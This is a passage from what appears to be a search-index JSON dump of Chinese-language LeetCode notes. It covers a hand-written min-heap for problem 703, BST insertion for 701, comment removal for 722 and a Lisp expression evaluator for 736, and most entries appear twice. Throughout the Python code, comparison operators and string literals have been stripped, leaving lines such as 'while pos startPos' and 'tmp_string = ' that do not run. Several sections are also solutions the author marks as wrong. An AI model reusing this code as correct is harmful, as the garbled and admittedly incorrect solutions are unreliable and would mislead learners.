\u5728\u5806\u7684Pos\u6240\u5728\u8282\u70b9\u7684\u5224\u65ad\uff0c\u8fdb\u884c\u4e0a\u6d6e\u5230\u5e94\u8be5\u5728\u7684\u4f4d\u7f6e newItem = heap [ pos ] while pos startPos : parentPos = ( pos - 1 ) 1 parent = heap [ parentPos ] if newItem = parent : heap [ pos ] = parent pos = parentPos continue break heap [ pos ] = newItem def _siftup ( heap , pos ): \u5728\u5806\u7684Pos\u7684\u6240\u5728\u8282\u70b9\u5224\u65ad endPos = len ( heap ) startPos = pos newItem = heap [ pos ] # why: \u4e3a\u4ec0\u4e48\u4e0d\u662f\u73b0\u5728\u5c31\u5224\u65ad\u5462\uff1f # \u9009\u62e9\u66f4\u5c0f\u7684\u5b69\u5b50 childPos = 2 * pos + 1 while childPos endPos : rightPos = childPos + 1 if rightPos endPos and heap [ childPos ] heap [ rightPos ]: childPos = rightPos # \u8ba9\u66f4\u5c0f\u7684\u5b69\u5b50\u4e0a\u6d6e \u5c0f\u6839\u5806 heap [ pos ] = heap [ childPos ] pos = childPos childPos = 2 * pos + 1 # \u8ba9\u4f20\u5165\u7684\u53c2\u6570\u6240\u5728\u7684\u8282\u70b9\u4e0b\u6c89\u5230\u6700\u5e95\u4e0b heap [ pos ] = newItem _siftdown ( heap , startPos , pos ) class KthLargest : def __init__ ( self , k , nums ): self . heap = [] self . k = k for num in nums : self . add ( num ) def add ( self , val ): if not self . heap or len ( self . heap ) self . k : heapPush ( self . heap , val ) elif len ( self . heap ) == self . k and val self . heap [ 0 ]: self . heap [ 0 ] = val # 5 5 10 4 9 5 _siftup ( self . heap , 0 ) # heapPush(self.heap, val) return self . heap [ 0 ] if len ( self . heap ) == self . k else None \u9519\u8bef \u4e0d\u80fdpop\uff01\uff01\uff01 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 import unittest def heapPush ( heap , item ): heap . append ( item ) _siftdown ( heap , 0 , len ( heap ) - 1 ) def _siftdown ( heap , startPos , pos ): \u5728\u5806\u7684Pos\u6240\u5728\u8282\u70b9\u7684\u5224\u65ad\uff0c\u8fdb\u884c\u4e0a\u6d6e\u5230\u5e94\u8be5\u5728\u7684\u4f4d\u7f6e newItem = heap [ pos ] while pos startPos : parentPos = ( pos - 1 ) 1 parent = heap [ parentPos ] if newItem parent : heap [ pos ] = parent pos = parentPos continue break heap [ pos ] = newItem def _siftup ( heap , pos ): \u5728\u5806\u7684Pos\u7684\u6240\u5728\u8282\u70b9\u5224\u65ad endPos = len ( heap ) startPos = pos newItem = heap [ pos ] # why: \u4e3a\u4ec0\u4e48\u4e0d\u662f\u73b0\u5728\u5c31\u5224\u65ad\u5462\uff1f # \u9009\u62e9\u66f4\u5c0f\u7684\u5b69\u5b50 childPos = 2 * pos + 1 while childPos endPos : rightPos = childPos if rightPos endPos and heap [ childPos ] heap [ rightPos ]: childPos = rightPos # \u8ba9\u66f4\u5c0f\u7684\u5b69\u5b50\u4e0a\u6d6e \u5c0f\u6839\u5806 heap [ pos ] = heap [ childPos ] pos = childPos childPos = 2 * pos + 1 # \u8ba9\u4f20\u5165\u7684\u53c2\u6570\u6240\u5728\u7684\u8282\u70b9\u4e0b\u6c89\u5230\u6700\u5e95\u4e0b heap [ pos ] = newItem _siftdown ( heap , startPos , pos ) class KthLargest : def __init__ ( self , k , nums ): self . heap = [] self . k = k for num in nums : self . add ( num ) def add ( self , val ): if not self . heap or len ( self . heap ) self . k : heapPush ( self . heap , val ) elif len ( self . heap ) = self . k and val self . heap [ 0 ]: self . heap . pop ( 0 ) if self . heap : _siftup ( self . heap , 0 ) heapPush ( self . heap , val ) return self . heap [ 0 ] if len ( self . heap ) == self . k else None # Your KthLargest object will be instantiated and called as such: # obj = KthLargest(k, nums) # param_1 = obj.add(val) class KthLargestTest ( unittest . TestCase ): def test_case2 ( self ): datas = [[ 7 , [ - 10 , 1 , 3 , 1 , 4 , 10 , 3 , 9 , 4 , 5 , 1 ]], [ 3 ], [ 2 ], [ 3 ], [ 1 ], [ 2 ], [ 4 ], [ 5 ], [ 5 ], [ 6 ], [ 7 ], [ 7 ], [ 8 ], [ 2 ], [ 3 ], [ 1 ], [ 1 ], [ 1 ], [ 10 ], [ 11 ], [ 5 ], [ 6 ], [ 2 ], [ 4 ], [ 7 ], [ 8 ], [ 5 ], [ 6 ]] expect = [ None , 3 , 3 , 3 , 3 , 3 , 3 , 4 , 4 , 4 , 5 , 5 , 5 , 5 , 5 , 5 , 5 , 5 , 6 , 7 , 7 , 7 , 7 , 7 , 7 , 7 , 7 , 7 ] kthLargest = KthLargest ( datas [ 0 ][ 0 ], datas [ 0 ][ 1 ]) for i in range ( 1 , len ( datas )): self . assertEqual ( kthLargest . add ( datas [ i ][ 0 ]), expect [ i ]) unittest . main ()","title":"701 710"},{"location":"LeetCode/vol 7/701-710/#701","text":"\u5f80\u4e8c\u53c9\u641c\u7d22\u6811\u4e2d\u63d2\u5165\u4e00\u4e2a\u503c","title":"701"},{"location":"LeetCode/vol 7/701-710/#_1","text":"\u76f4\u63a5\u66b4\u529b\u63d2\u5165 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Solution : def insertIntoBST ( self , root : TreeNode , val : int ) - TreeNode : p = root while p : if val p . val : if p . right : p = p . right else : p . right = TreeNode ( val ) break elif val p . val : if p . left : p = p . left else : p . left = TreeNode ( val ) break return root","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 7/701-710/#_2","text":"\u6216\u8005\u9012\u5f52 1 2 3 4 5 6 7 8 9 class Solution : def insertIntoBST ( self , root : TreeNode , val : int ) - TreeNode : if not root : return TreeNode ( val ) if root . val val : root . left = self . insertIntoBST ( root . left , val ) else : root . right = self . insertIntoBST ( root . right , val ) return root","title":"\u6cd5\u4e8c"},{"location":"LeetCode/vol 7/701-710/#703","text":"\u5b9e\u73b0\u4e00\u4e2a\u7c7b\u6765\u67e5\u627e\u6d41\u4e2d\u7b2ck\u4e2a\u6700\u5927\u5143\u7d20\u3002 \u8bf7\u6ce8\u610f\uff0c\u5b83\u662f\u6392\u5e8f\u987a\u5e8f\u4e2d\u7684\u7b2ck\u4e2a\u6700\u5927\u5143\u7d20\uff0c\u800c\u4e0d\u662f\u7b2ck\u4e2a\u4e0d\u540c\u5143\u7d20\u3002 KthLargest\u7c7b\u5c06\u6709\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u5b83\u63a5\u53d7\u4e00\u4e2a\u6574\u6570k\u548c\u4e00\u4e2a\u6574\u6570\u6570\u7ec4nums\uff0c\u5b83\u5305\u542b\u6765\u81ea\u6d41\u7684\u521d\u59cb\u5143\u7d20\u3002 \u5bf9\u4e8e\u65b9\u6cd5KthLargest.add\u7684\u6bcf\u6b21\u8c03\u7528\uff0c\u8fd4\u56de\u8868\u793a\u6d41\u4e2d\u7b2ck\u4e2a\u6700\u5927\u5143\u7d20\u7684\u5143\u7d20\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 int k = 3; int[] arr = [4,5,8,2]; KthLargest kthLargest = new KthLargest(3, arr); // 2 3 4 5 8 kthLargest.add(3); // returns 4 // 2 3 4 5 5 8 kthLargest.add(5); // returns 5 // 2 3 4 5 5 8 10 kthLargest.add(10); // returns 5 // 2 3 4 5 5 8 9 10 kthLargest.add(9); // returns 8 // 2 3 4 5 5 8 8 9 10 kthLargest.add(4); // returns 8 \u60f3\u6cd5 \u5c0f\u6839\u5806\uff0c\u7ef4\u62a4\u4e00\u4e2a\u6709k\u5927\u7684\u5c0f\u6839\u5806\uff0c\u6bd4\u5806\u9876\u6570\u5b57\u8fd8\u8981\u5c0f\u7684\u5c31\u4e0d\u653e\u5806\u4e86\uff0c\u5426\u5219\u7684\u5c31\u628a\u5806\u9876\u7684\u5143\u7d20pop\u6389\uff0c\u7136\u540e\u91cd\u65b0\u6392\u5217\u5806 \u91cd\u70b9\u662f\u5b9e\u73b0\u5c0f\u6839\u5806\u7684\u8fc7\u7a0b\u3002\u3002\u3002","title":"703"},{"location":"LeetCode/vol 7/701-710/#_3","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 def heapPush ( heap , item ): heap . append ( item ) _siftdown ( heap , 0 , len ( heap ) - 1 ) def _siftdown ( heap , startPos , pos ): \u5728\u5806\u7684Pos\u6240\u5728\u8282\u70b9\u7684\u5224\u65ad\uff0c\u8fdb\u884c\u4e0a\u6d6e\u5230\u5e94\u8be5\u5728\u7684\u4f4d\u7f6e newItem = heap [ pos ] while pos startPos : parentPos = ( pos - 1 ) 1 parent = heap [ parentPos ] if newItem = parent : heap [ pos ] = parent pos = parentPos continue break heap [ pos ] = newItem def _siftup ( heap , pos ): \u5728\u5806\u7684Pos\u7684\u6240\u5728\u8282\u70b9\u5224\u65ad endPos = len ( heap ) startPos = pos newItem = heap [ pos ] # why: \u4e3a\u4ec0\u4e48\u4e0d\u662f\u73b0\u5728\u5c31\u5224\u65ad\u5462\uff1f # \u9009\u62e9\u66f4\u5c0f\u7684\u5b69\u5b50 childPos = 2 * pos + 1 while childPos endPos : rightPos = childPos + 1 if rightPos endPos and heap [ childPos ] heap [ rightPos ]: childPos = rightPos # \u8ba9\u66f4\u5c0f\u7684\u5b69\u5b50\u4e0a\u6d6e \u5c0f\u6839\u5806 heap [ pos ] = heap [ childPos ] pos = childPos childPos = 2 * pos + 1 # \u8ba9\u4f20\u5165\u7684\u53c2\u6570\u6240\u5728\u7684\u8282\u70b9\u4e0b\u6c89\u5230\u6700\u5e95\u4e0b heap [ pos ] = newItem _siftdown ( heap , startPos , pos ) class KthLargest : def __init__ ( self , k , nums ): self . heap = [] self . k = k for num in nums : self . add ( num ) def add ( self , val ): if not self . heap or len ( self . heap ) self . k : heapPush ( self . heap , val ) elif len ( self . heap ) == self . k and val self . heap [ 0 ]: self . heap [ 0 ] = val # 5 5 10 4 9 5 _siftup ( self . heap , 0 ) # heapPush(self.heap, val) return self . heap [ 0 ] if len ( self . heap ) == self . k else None","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 7/701-710/#_4","text":"\u4e0d\u80fdpop\uff01\uff01\uff01 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 import unittest def heapPush ( heap , item ): heap . append ( item ) _siftdown ( heap , 0 , len ( heap ) - 1 ) def _siftdown ( heap , startPos , pos ): \u5728\u5806\u7684Pos\u6240\u5728\u8282\u70b9\u7684\u5224\u65ad\uff0c\u8fdb\u884c\u4e0a\u6d6e\u5230\u5e94\u8be5\u5728\u7684\u4f4d\u7f6e newItem = heap [ pos ] while pos startPos : parentPos = ( pos - 1 ) 1 parent = heap [ parentPos ] if newItem parent : heap [ pos ] = parent pos = parentPos continue break heap [ pos ] = newItem def _siftup ( heap , pos ): \u5728\u5806\u7684Pos\u7684\u6240\u5728\u8282\u70b9\u5224\u65ad endPos = len ( heap ) startPos = pos newItem = heap [ pos ] # why: \u4e3a\u4ec0\u4e48\u4e0d\u662f\u73b0\u5728\u5c31\u5224\u65ad\u5462\uff1f # \u9009\u62e9\u66f4\u5c0f\u7684\u5b69\u5b50 childPos = 2 * pos + 1 while childPos endPos : rightPos = childPos if rightPos endPos and heap [ childPos ] heap [ rightPos ]: childPos = rightPos # \u8ba9\u66f4\u5c0f\u7684\u5b69\u5b50\u4e0a\u6d6e \u5c0f\u6839\u5806 heap [ pos ] = heap [ childPos ] pos = childPos childPos = 2 * pos + 1 # \u8ba9\u4f20\u5165\u7684\u53c2\u6570\u6240\u5728\u7684\u8282\u70b9\u4e0b\u6c89\u5230\u6700\u5e95\u4e0b heap [ pos ] = newItem _siftdown ( heap , startPos , pos ) class KthLargest : def __init__ ( self , k , nums ): self . heap = [] self . k = k for num in nums : self . add ( num ) def add ( self , val ): if not self . heap or len ( self . heap ) self . k : heapPush ( self . heap , val ) elif len ( self . heap ) = self . k and val self . heap [ 0 ]: self . heap . pop ( 0 ) if self . heap : _siftup ( self . heap , 0 ) heapPush ( self . heap , val ) return self . heap [ 0 ] if len ( self . heap ) == self . k else None # Your KthLargest object will be instantiated and called as such: # obj = KthLargest(k, nums) # param_1 = obj.add(val) class KthLargestTest ( unittest . TestCase ): def test_case2 ( self ): datas = [[ 7 , [ - 10 , 1 , 3 , 1 , 4 , 10 , 3 , 9 , 4 , 5 , 1 ]], [ 3 ], [ 2 ], [ 3 ], [ 1 ], [ 2 ], [ 4 ], [ 5 ], [ 5 ], [ 6 ], [ 7 ], [ 7 ], [ 8 ], [ 2 ], [ 3 ], [ 1 ], [ 1 ], [ 1 ], [ 10 ], [ 11 ], [ 5 ], [ 6 ], [ 2 ], [ 4 ], [ 7 ], [ 8 ], [ 5 ], [ 6 ]] expect = [ None , 3 , 3 , 3 , 3 , 3 , 3 , 4 , 4 , 4 , 5 , 5 , 5 , 5 , 5 , 5 , 5 , 5 , 6 , 7 , 7 , 7 , 7 , 7 , 7 , 7 , 7 , 7 ] kthLargest = KthLargest ( datas [ 0 ][ 0 ], datas [ 0 ][ 1 ]) for i in range ( 1 , len ( datas )): self . assertEqual ( kthLargest . add ( datas [ i ][ 0 ]), expect [ i ]) unittest . main ()","title":"\u9519\u8bef"},{"location":"LeetCode/vol 7/721-730/","text":"722 \u7ed9\u5b9a\u4e00\u6bb5\u4ee3\u7801\u6bb5\uff0c\u5176\u4e2d\u5305\u62ec\u6ce8\u91ca\u90e8\u5206\uff0c\u6ce8\u91ca\u5206\u4e3a\u4e24\u79cd\u4e2a\uff1a // \u548c /* */ \uff0c\u73b0\u8981\u6c42\u5c06\u4ee3\u7801\u6bb5\u4e2d\u7684\u6ce8\u91ca\u90e8\u5206\u5220\u9664\u8fd4\u56de\u53ea\u6709\u6709\u6548\u4ee3\u7801\u90e8\u5206 \u6ce8\u610f // \u53ea\u80fd\u6ce8\u91ca\u4e00\u884c\uff0c\u800c /* \u5219\u53ef\u4ee5\u6ce8\u91ca\u4ece\u5176\u5f00\u59cb\u5230 */ \u7684\u90e8\u5206\uff0c\u6240\u4ee5\u5bf9\u4e8e\u4e24\u79cd\u4e2a\u4e0d\u540c\u7684\u6ce8\u91ca\u5904\u7406\u7684\u65b9\u5f0f\u5e94\u8be5\u4e0d\u540c\u3002\u800c\u4e14\u6ce8\u610f\u6ce8\u91ca\u53ef\u80fd\u4e0d\u662f\u5355\u72ec\u7684\u4e00\u884c\uff0c\u53ef\u80fd\u662f\u518d\u6709\u6548\u4ee3\u7801\u884c\u540e\u9762\u52a0\u5165\u4e00\u884c\u6ce8\u91ca\u6216\u8005\u591a\u884c\u6ce8\u91ca\u3002 \u4f8b\u5b50\u5982\u4e0b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 Input: source = [ /*Test program */ , int main() , { , // variable declaration , int a, b, c; , /* This is a test , multiline , comment for , testing */ , a = b + c; , } ] The line by line code is visualized as below: /*Test program */ int main() { // variable declaration int a, b, c; /* This is a test multiline comment for testing */ a = b + c; } Output: [ int main() , { , , int a, b, c; , a = b + c; , } ] The line by line code is visualized as below: int main() { int a, b, c; a = b + c; } Explanation: The string /* denotes a block comment, including line 1 and lines 6-9. The string // denotes line 4 as comments. \u60f3\u6cd5 \u6ca1\u4ec0\u4e48\u60f3\u6cd5\u66b4\u529b\u4e0a \u91c7\u7528\u4e00\u4e2a\u6807\u5fd7\u4f4d\u6807\u8bb0\u5f53\u524d\u662f\u4e0d\u662f\u5757\u6ce8\u91ca\uff0c\u662f\u7684\u8bdd\u6ce8\u610f\u4e00\u4e0b\u540e\u7eed\u7684\u5904\u7406\uff0c\u6bd4\u5982\u540e\u7eed\u7684\u6709\u6ca1\u6709\u5757\u6ce8\u91ca\u7684\u7ed3\u675f\u7b26\uff0c\u6709\u7684\u8bdd\u8df3\u8fc7\uff0c\u6ca1\u6709\u7684\u8bdd\u5c06\u5408\u6cd5\u7684\u6dfb\u52a0\u8fdbbuffer\u91cc \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 class Solution : def removeComments ( self , source ): res = [] isBlockComent = False tmp_string = for string in source : i = 0 while i len ( string ): if not isBlockComent : if string [ i : i + 2 ] == // : break elif string [ i : i + 2 ] == /* : isBlockComent = True i += 1 else : tmp_string += string [ i ] else : if string [ i : i + 2 ] == */ : isBlockComent = False i += 1 i += 1 if not isBlockComent and tmp_string : res . append ( tmp_string ) tmp_string = return res \u9519\u8bef Todo \u8fd9\u91cc\u6709\u5c11\u8bb8\u7684\u4e0d\u540c\uff0c\u4f46\u5c31\u662f\u9519\u8bef\uff0c\u9700\u8981\u8ba2\u6b63\u5e76\u91cd\u5199 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # source = [ a/*comment , line , more_comment*/b ] # \u4f1a\u8f93\u51fa # b class Solution : def removeComments ( self , source ): res = [] isBlockComent = False for string in source : i = 0 # \u8fd9\u91cc\u4f1a\u5237\u65b0\u4e4b\u524d\u7684\u6240\u4fdd\u5b58\u7684\u503c tmp_string = while i len ( string ): if not isBlockComent : if string [ i : i + 2 ] == // : break elif string [ i : i + 2 ] == /* : isBlockComent = True i += 1 else : tmp_string += string [ i ] else : if string [ i : i + 2 ] == */ : isBlockComent = False i += 1 i += 1 # \u68c0\u67e5\u7684\u65f6\u5019\u4e0e tmp_string\u6709\u503c\u7684\u60c5\u51b5\u51b2\u7a81 if not isBlockComent and tmp_string : res . append ( tmp_string ) return res","title":"721 730"},{"location":"LeetCode/vol 7/721-730/#722","text":"\u7ed9\u5b9a\u4e00\u6bb5\u4ee3\u7801\u6bb5\uff0c\u5176\u4e2d\u5305\u62ec\u6ce8\u91ca\u90e8\u5206\uff0c\u6ce8\u91ca\u5206\u4e3a\u4e24\u79cd\u4e2a\uff1a // \u548c /* */ \uff0c\u73b0\u8981\u6c42\u5c06\u4ee3\u7801\u6bb5\u4e2d\u7684\u6ce8\u91ca\u90e8\u5206\u5220\u9664\u8fd4\u56de\u53ea\u6709\u6709\u6548\u4ee3\u7801\u90e8\u5206 \u6ce8\u610f // \u53ea\u80fd\u6ce8\u91ca\u4e00\u884c\uff0c\u800c /* \u5219\u53ef\u4ee5\u6ce8\u91ca\u4ece\u5176\u5f00\u59cb\u5230 */ \u7684\u90e8\u5206\uff0c\u6240\u4ee5\u5bf9\u4e8e\u4e24\u79cd\u4e2a\u4e0d\u540c\u7684\u6ce8\u91ca\u5904\u7406\u7684\u65b9\u5f0f\u5e94\u8be5\u4e0d\u540c\u3002\u800c\u4e14\u6ce8\u610f\u6ce8\u91ca\u53ef\u80fd\u4e0d\u662f\u5355\u72ec\u7684\u4e00\u884c\uff0c\u53ef\u80fd\u662f\u518d\u6709\u6548\u4ee3\u7801\u884c\u540e\u9762\u52a0\u5165\u4e00\u884c\u6ce8\u91ca\u6216\u8005\u591a\u884c\u6ce8\u91ca\u3002 \u4f8b\u5b50\u5982\u4e0b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 Input: source = [ /*Test program */ , int main() , { , // variable declaration , int a, b, c; , /* This is a test , multiline , comment for , testing */ , a = b + c; , } ] The line by line code is visualized as below: /*Test program */ int main() { // variable declaration int a, b, c; /* This is a test multiline comment for testing */ a = b + c; } Output: [ int main() , { , , int a, b, c; , a = b + c; , } ] The line by line code is visualized as below: int main() { int a, b, c; a = b + c; } Explanation: The string /* denotes a block comment, including line 1 and lines 6-9. The string // denotes line 4 as comments. \u60f3\u6cd5 \u6ca1\u4ec0\u4e48\u60f3\u6cd5\u66b4\u529b\u4e0a \u91c7\u7528\u4e00\u4e2a\u6807\u5fd7\u4f4d\u6807\u8bb0\u5f53\u524d\u662f\u4e0d\u662f\u5757\u6ce8\u91ca\uff0c\u662f\u7684\u8bdd\u6ce8\u610f\u4e00\u4e0b\u540e\u7eed\u7684\u5904\u7406\uff0c\u6bd4\u5982\u540e\u7eed\u7684\u6709\u6ca1\u6709\u5757\u6ce8\u91ca\u7684\u7ed3\u675f\u7b26\uff0c\u6709\u7684\u8bdd\u8df3\u8fc7\uff0c\u6ca1\u6709\u7684\u8bdd\u5c06\u5408\u6cd5\u7684\u6dfb\u52a0\u8fdbbuffer\u91cc","title":"722"},{"location":"LeetCode/vol 7/721-730/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 class Solution : def removeComments ( self , source ): res = [] isBlockComent = False tmp_string = for string in source : i = 0 while i len ( string ): if not isBlockComent : if string [ i : i + 2 ] == // : break elif string [ i : i + 2 ] == /* : isBlockComent = True i += 1 else : tmp_string += string [ i ] else : if string [ i : i + 2 ] == */ : isBlockComent = False i += 1 i += 1 if not isBlockComent and tmp_string : res . append ( tmp_string ) tmp_string = return res","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 7/721-730/#_2","text":"Todo \u8fd9\u91cc\u6709\u5c11\u8bb8\u7684\u4e0d\u540c\uff0c\u4f46\u5c31\u662f\u9519\u8bef\uff0c\u9700\u8981\u8ba2\u6b63\u5e76\u91cd\u5199 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # source = [ a/*comment , line , more_comment*/b ] # \u4f1a\u8f93\u51fa # b class Solution : def removeComments ( self , source ): res = [] isBlockComent = False for string in source : i = 0 # \u8fd9\u91cc\u4f1a\u5237\u65b0\u4e4b\u524d\u7684\u6240\u4fdd\u5b58\u7684\u503c tmp_string = while i len ( string ): if not isBlockComent : if string [ i : i + 2 ] == // : break elif string [ i : i + 2 ] == /* : isBlockComent = True i += 1 else : tmp_string += string [ i ] else : if string [ i : i + 2 ] == */ : isBlockComent = False i += 1 i += 1 # \u68c0\u67e5\u7684\u65f6\u5019\u4e0e tmp_string\u6709\u503c\u7684\u60c5\u51b5\u51b2\u7a81 if not isBlockComent and tmp_string : res . append ( tmp_string ) return res","title":"\u9519\u8bef"},{"location":"LeetCode/vol 7/731-740/","text":"736 Todo \u5b9e\u73b0\u4e00\u4e2aLisp\u8868\u8fbe\u5f0f\u7684\u89e3\u6790\u5668 \u8f93\u5165\u4e00\u4e2a\u8868\u793a\u7c7b\u4f3cLisp\u7684\u8868\u8fbe\u5f0f\u7684\u5b57\u7b26\u4e32\u8868\u8fbe\u5f0f\uff0c\u4ee5\u8fd4\u56de\u8fd0\u7b97\u7684\u6574\u6570\u503c \u8868\u8fbe\u5f0f\u8bed\u6cd5\u5982\u4e0b \u7565 \u4f8b\u5b50 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 Input: (add 1 2) Output: 3 Input: (mult 3 (add 2 3)) Output: 15 Input: (let x 2 (mult x 5)) Output: 10 Input: (let x 2 (mult x (let x 3 y 4 (add x y)))) Output: 14 Explanation: In the expression (add x y), when checking for the value of the variable x, we check from the innermost scope to the outermost in the context of the variable we are trying to evaluate. Since x = 3 is found first, the value of x is 3. Input: (let x 3 x 2 x) Output: 2 Explanation: Assignment in let statements is processed sequentially. Input: (let x 1 y 2 x (add x y) (add x y)) Output: 5 Explanation: The first (add x y) evaluates as 3, and is assigned to x. The second (add x y) evaluates as 3+2 = 5. Input: (let x 2 (add (let x 3 (let x 4 x)) x)) Output: 6 Explanation: Even though (let x 4 x) has a deeper scope, it is outside the context of the final x in the add-expression. That final x will equal 2. Input: (let a1 3 b2 (add a1 1) b2) Output 4 Explanation: Variable names can contain digits after the first character. \u60f3\u6cd5 \u83ab\u5f97\u60f3\u6cd5 \u8fd9\u4e2a\u5c31\u8003\u9a8c\u4e86\u5de5\u7a0b\u80fd\u529b\u4e86\uff0c\u6211\u89c9\u5f97\u53ef\u4ee5\u6269\u5c55\u540e\u5f53\u4e2a\u9762\u8bd5\u9898\u4ec0\u4e48\u7684 lisp \u8868\u8fbe\u5f0f\u554a\u3002\u3002\u3002\u53ef\u4ee5\u8bd5\u8bd5\u9012\u5f52 \u4e0d\u8fc7\u9700\u8981\u786e\u5b9a\u62ec\u53f7\u7684\u8303\u56f4\uff0c\u4ee5\u53ca\u8bfb\u53d6\u6570\u7684\u662f\u9700\u8981\u8bfb\u53d6\u5230\u7a7a\u683c \u6cd5\u4e00 \u54e6\u6211\u9009\u62e9\u4e86\u770b\u5176\u4ed6\u4eba\u5199\u7684\uff0c\u5988\u7684\u5176\u4ed6\u4eba\u5199\u7684\u5c31\u662f\u597d\u3002\u3002\u3002\u3002\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 class Solution : def evaluate ( self , expression ): st , d , tokens = [], {}, [ ] def getval ( x ): return d . get ( x , x ) def evaluate ( tokens ): # \u8fd0\u7b97 if tokens [ 0 ] in ( add , mult ): tmp = list ( map ( int , map ( getval , tokens [ 1 :]))) return str ( tmp [ 0 ] + tmp [ 1 ] if tokens [ 0 ] == add else tmp [ 0 ] * tmp [ 1 ]) # let \u590d\u5236 else : for i in range ( 1 , len ( tokens ) - 1 , 2 ): if tokens [ i + 1 ]: d [ tokens [ i ]] = getval ( tokens [ i + 1 ]) return getval ( tokens [ - 1 ]) for c in expression : # \u8fd9\u91cc\u4e0d\u592a\u4e86\u89e3 if c == ( : # \u68c0\u6d4b\u5f53\u524d\u7684\u5b57\u7b26\u662f\u5426\u662f \u5d4c\u5957\u7684\u62ec\u53f7 # \u91cd\u70b9\u662f \u662f\u5426\u4e3a \u8d4b\u503c\u8bed\u53e5 if tokens [ 0 ] == let : evaluate ( tokens ) st . append (( tokens , dict ( d ))) tokens = [ ] elif c == : tokens . append ( ) elif c == ) : val = evaluate ( tokens ) tokens , d = st . pop () tokens [ - 1 ] += val else : tokens [ - 1 ] += c return int ( tokens [ 0 ])","title":"731 740"},{"location":"LeetCode/vol 7/731-740/#736","text":"Todo \u5b9e\u73b0\u4e00\u4e2aLisp\u8868\u8fbe\u5f0f\u7684\u89e3\u6790\u5668 \u8f93\u5165\u4e00\u4e2a\u8868\u793a\u7c7b\u4f3cLisp\u7684\u8868\u8fbe\u5f0f\u7684\u5b57\u7b26\u4e32\u8868\u8fbe\u5f0f\uff0c\u4ee5\u8fd4\u56de\u8fd0\u7b97\u7684\u6574\u6570\u503c \u8868\u8fbe\u5f0f\u8bed\u6cd5\u5982\u4e0b \u7565 \u4f8b\u5b50 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 Input: (add 1 2) Output: 3 Input: (mult 3 (add 2 3)) Output: 15 Input: (let x 2 (mult x 5)) Output: 10 Input: (let x 2 (mult x (let x 3 y 4 (add x y)))) Output: 14 Explanation: In the expression (add x y), when checking for the value of the variable x, we check from the innermost scope to the outermost in the context of the variable we are trying to evaluate. Since x = 3 is found first, the value of x is 3. Input: (let x 3 x 2 x) Output: 2 Explanation: Assignment in let statements is processed sequentially. Input: (let x 1 y 2 x (add x y) (add x y)) Output: 5 Explanation: The first (add x y) evaluates as 3, and is assigned to x. The second (add x y) evaluates as 3+2 = 5. Input: (let x 2 (add (let x 3 (let x 4 x)) x)) Output: 6 Explanation: Even though (let x 4 x) has a deeper scope, it is outside the context of the final x in the add-expression. That final x will equal 2. Input: (let a1 3 b2 (add a1 1) b2) Output 4 Explanation: Variable names can contain digits after the first character. \u60f3\u6cd5 \u83ab\u5f97\u60f3\u6cd5 \u8fd9\u4e2a\u5c31\u8003\u9a8c\u4e86\u5de5\u7a0b\u80fd\u529b\u4e86\uff0c\u6211\u89c9\u5f97\u53ef\u4ee5\u6269\u5c55\u540e\u5f53\u4e2a\u9762\u8bd5\u9898\u4ec0\u4e48\u7684 lisp \u8868\u8fbe\u5f0f\u554a\u3002\u3002\u3002\u53ef\u4ee5\u8bd5\u8bd5\u9012\u5f52 \u4e0d\u8fc7\u9700\u8981\u786e\u5b9a\u62ec\u53f7\u7684\u8303\u56f4\uff0c\u4ee5\u53ca\u8bfb\u53d6\u6570\u7684\u662f\u9700\u8981\u8bfb\u53d6\u5230\u7a7a\u683c","title":"736"},{"location":"LeetCode/vol 7/731-740/#_1","text":"\u54e6\u6211\u9009\u62e9\u4e86\u770b\u5176\u4ed6\u4eba\u5199\u7684\uff0c\u5988\u7684\u5176\u4ed6\u4eba\u5199\u7684\u5c31\u662f\u597d\u3002\u3002\u3002\u3002\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 class Solution : def evaluate ( self , expression ): st , d , tokens = [], {}, [ ] def getval ( x ): return d . get ( x , x ) def evaluate ( tokens ): # \u8fd0\u7b97 if tokens [ 0 ] in ( add , mult ): tmp = list ( map ( int , map ( getval , tokens [ 1 :]))) return str ( tmp [ 0 ] + tmp [ 1 ] if tokens [ 0 ] == add else tmp [ 0 ] * tmp [ 1 ]) # let \u590d\u5236 else : for i in 